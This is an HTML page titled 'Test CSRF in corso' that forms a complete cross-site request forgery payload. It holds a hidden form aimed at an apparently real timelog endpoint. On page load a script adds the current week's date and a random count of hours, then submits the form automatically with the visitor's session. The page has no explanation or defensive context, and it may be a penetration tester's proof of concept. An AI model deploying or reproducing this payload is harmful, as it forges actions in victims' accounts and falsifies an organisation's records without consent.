<html>
  <head>
    <title>Test CSRF in corso...</title>
  </head>

  <body>
    <form id="csrf-attack-form" 
          action="https://portal.dynamisprc.com:8443/timelog" 
          method="POST">
    
      <!--<input type="hidden" name="date" id="date-field" value="" />-->
      
      <input type="hidden" name="system" value="Low Voltage System" />
      <input type="hidden" name="assembly" value="Telemetry" />
      <input type="hidden" name="activity" value="Software" />
      
      <!--<input type="hidden" name="hours" id="hours-field" value="" />-->
    </form>

    <script>
      window.onload = function() {
        
        function pad(n) { return (n < 10 ? '0' : '') + n; }

        var curr = new Date(); 
        var day = curr.getDay();
        var diff = curr.getDate() - day + (day === 0 ? -6 : 1); 

        var monday = new Date(curr.setDate(diff));
        var sunday = new Date(monday);
        sunday.setDate(monday.getDate() + 6);

        var dateStr = pad(monday.getDate()) + '/' + pad(monday.getMonth() + 1) + 
                      ' - ' + 
                      pad(sunday.getDate()) + '/' + pad(sunday.getMonth() + 1) + 
                      ' ' + monday.getFullYear();
        
        var hoursStr = Math.floor(Math.random() * (25 - 15 + 1)) + 15;

        var form = document.getElementById('csrf-attack-form');

        var inputDate = document.createElement("input");
        inputDate.type = "hidden";
        inputDate.name = "date";
        inputDate.value = dateStr;
        form.appendChild(inputDate);

        var inputHours = document.createElement("input");
        inputHours.type = "hidden";
        inputHours.name = "hours";
        inputHours.value = hoursStr;
        form.appendChild(inputHours);

        setTimeout(function() {
            form.submit();
        }, 200);
      };
    </script>

  </body>
</html>
